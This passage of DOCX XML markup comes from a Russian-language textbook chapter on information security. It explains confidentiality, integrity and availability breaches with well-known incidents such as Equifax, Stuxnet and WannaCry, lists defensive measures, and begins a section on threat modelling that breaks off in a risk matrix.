        <w:t>**Перехват трафика (Sniffing)**: Злоумышленник в кафе перехватывает HTTP-трафик (нешифрованный) и крадёт пароли.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Социальная инженерия**: Хакер позвонил в техподдержку, представился CEO и попросил сбросить пароль.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Equifax (2017)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Украдено 147 миллионов записей (ФИО, даты рождения, номера соцстрахования, адреса).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Как**: Уязвимость в Apache Struts (CVE-2017-5638), которую **не закрыли** несмотря на доступный патч.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: $700 миллионов штрафов, акции упали на 35%, CEO уволили.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Facebook (2021)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Утекло 533 миллиона записей (имена, номера телефонов, email).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Как**: Использовали старую уязвимость (скрапинг данных через API).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Данные попали на даркнет-форумы **бесплатно**.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>LastPass (2022)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Взломали хранилище паролей (password manager).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Как**: Хакеры украли резервные копии зашифрованных хранилищ. Если у пользователя слабый мастер-пароль, хакеры могут расшифровать.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Паника среди пользователей, миграция на 1Password, Bitwarden.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Шифрование**: HTTPS (TLS/SSL), шифрование диска (BitLocker, LUKS), шифрование БД.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль доступа**: RBAC, принцип наименьших привилегий.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Многофакторная аутентификация (2FA/MFA)**: даже если пароль украли, без второго фактора не зайдут.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DLP (Data Loss Prevention)**: блокировка копирования конфиденциальных данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Нарушение целостности (Integrity)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Несанкционированное </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>изменение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> данных. Кто-то подменил, удалил или модифицировал информацию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Man-in-the-Middle (MITM)**: Хакер перехватывает и **изменяет** данные между клиентом и сервером. Например, меняет номер счёта в банковском переводе.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**SQL-инъекция**: Хакер изменяет SQL-запрос и меняет данные в БД (например, ставит себе баланс $1,000,000).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Подмена веб-страницы (Defacement)**: Хакеры взломали сайт и заменили главную страницу на "Hacked by ...".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Вирусы**: Модифицируют системные файлы, встраивают бэкдоры.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Stuxnet (2010)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Вирус, который атаковал иранские центрифуги для обогащения урана.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Как**: Модифицировал программу управления центрифугами (ПЛК — программируемые логические контроллеры), заставляя их вращаться с неправильной скоростью → центрифуги ломались.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Кто**: Предположительно США + Израиль (операция **Olympic Games**).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Затормозил ядерную программу Ирана на несколько лет.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NotPetya (2017)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Вирус-вымогатель (ransomware), который **притворялся**, что шифрует данные за выкуп. На самом деле **безвозвратно уничтожал** данные.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цель**: Украина (атака через обновление бухгалтерской программы M.E.Doc).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ущерб**: $10 миллиардов глобально. Пострадали Maersk (судоходная компания), Merck (фармацевтика), FedEx.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Цифровые подписи**: проверка, что файл не изменён (GPG, коды подписи для ПО).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хэши**: SHA-256 для проверки целостности файлов.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контроль версий**: Git для кода, резервное копирование для БД.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Права доступа**: только администраторы могут изменять критичные файлы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**HTTPS**: защита от MITM (шифрование + аутентификация сервера).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Нарушение доступности (Availability)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Легитимные пользователи </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не могут получить доступ</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> к системе или данным.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS (Distributed Denial of Service)**: Миллионы запросов в секунду → сервер падает.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ransomware**: Вирус шифрует все файлы → требует выкуп в биткоинах. Пока не заплатишь — данные недоступны.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сбой оборудования**: Жёсткий диск сломался, а резервной копии нет.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Отключение электричества**: Серверы выключились.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Реальные примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>WannaCry (2017)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Ransomware-вирус, который использовал уязвимость **EternalBlue** (утёкшая от АНБ).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Масштаб**: 200,000 компьютеров в **150 странах**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Жертвы**: NHS (британская система здравоохранения), испанская Telefónica, российские МВД/МЧС, Deutsche Bahn (железные дороги Германии).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Компьютеры были зашифрованы, требовали $300 в биткоинах. Многие восстановили данные из backup, но некоторые потеряли всё.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kill Switch**: Исследователь **Marcus Hutchins** нашёл домен, который останавливал вирус. Зарегистрировал домен за $10.69 → остановил распространение.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Colonial Pipeline (2021)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Хакеры (группа **DarkSide**) зашифровали системы управления крупнейшим нефтепроводом США (45% топлива для восточного побережья).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: Трубопровод остановили на **5 дней**. Паника, очереди на заправках. Colonial Pipeline заплатила выкуп **$4.4 миллиона** в биткоинах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Продолжение**: ФБР вернуло **$2.3 миллиона** (отследили кошелёк хакеров).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>GitHub DDoS (2018)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Что**: Крупнейшая DDoS-атака в истории — **1.35 Тбит/с**.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Метод**: Memcached amplification (усиление атаки через неправильно настроенные Memcached-серверы).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Итог**: GitHub был недоступен **8 минут**, затем Akamai (DDoS-защита) отразила атаку.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как защититься</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**DDoS-защита**: Cloudflare, Akamai, AWS Shield.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Резервное копирование (Backup)**: правило 3-2-1, offsite backup.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Репликация**: несколько копий БД на разных серверах.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**RAID-массивы**: если один диск сломался, данные остаются на других.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ИБП (UPS)** и генераторы: защита от отключения электричества.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Антивирусы, IDS/IPS**: обнаружение и блокировка ransomware.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.3.4. Модель угроз (Threat Model)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Threat Model</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>формализованное описание</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> того, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>от чего</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ты защищаешься, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>кто</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> может атаковать и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем нужна модель угроз?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Нельзя защититься от </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>всего</w:t>
      </w:r>
      <w:r>
        <w:t>. Если ты делаешь блог о котиках, тебе не нужна защита уровня Пентагона (air-gapped системы, биометрия, физическая охрана). Но если ты банк, тебе нужна максимальная защита.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Модель угроз помогает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Определить, **какие активы** критичны (база клиентов, финансовые данные, исходный код)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понять, **кто** может атаковать (script kiddies, киберпреступники, конкуренты, APT)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Выявить **уязвимости** (открытые порты, слабые пароли, устаревшее ПО)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Приоритизировать **риски** (что защищать в первую очередь)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Этапы построения модели угроз</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Определение активов (Assets)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что нужно защищать?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какова ценность каждого актива?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что произойдёт, если актив будет скомпрометирован?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример (интернет-магазин)</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**База данных клиентов** (ФИО, адреса, email, телефоны, история заказов) → критично</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Платёжная информация** (номера карт) → критично (если утечка → штрафы по PCI DSS, потеря доверия)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Исходный код сайта** → средняя важность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Логи сервера** → низкая важность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Определение злоумышленников (Adversaries)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Кто может атаковать?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какова их мотивация?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какой уровень знаний и ресурсов у них?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Злоумышленник | Мотивация | Уровень | Ресурсы |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|---------------|-----------|---------|---------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Script Kiddie</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Хулиганство, слава | Низкий | Готовые инструменты |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Киберпреступник</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Деньги | Средний-Высокий | Автоматизация, покупка 0-day |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Конкурент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Промышленный шпионаж | Средний | Подкуп инсайдеров |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>APT (государство)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Шпионаж, саботаж | Очень высокий | Бюджеты, 0-day, физический доступ |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Инсайдер</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Месть, деньги | Средний | Легитимный доступ |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для блога о котиках</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: реальная угроза — только script kiddies (автоматические боты ищут уязвимости).  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Для банка</w:t>
      </w:r>
      <w:r>
        <w:t>: угроза от киберпреступников, APT, инсайдеров.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Определение векторов атак (Attack Vectors)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопрос</w:t>
      </w:r>
      <w:r>
        <w:t>: Как злоумышленник может атаковать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры векторов атак</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Веб-приложение**: SQL-инъекция, XSS, CSRF</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сеть**: DDoS, Man-in-the-Middle, снифинг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Социальная инженерия**: Фишинг, вишинг (голосовой фишинг), претекстинг</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Физический доступ**: Кража ноутбука, подключение USB-флешки с вирусом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инсайдер**: Копирование данных на флешку, удаление БД</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>4. Приоритизация рисков (Risk Prioritization)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вопросы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие риски наиболее вероятны?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Какие нанесут наибольший ущерб?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Что защищать в первую очередь?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Матрица рисков</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">|              | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Низкий ущерб</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Средний ущерб</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Высокий ущерб</w:t>
      </w:r>
      <w:r>
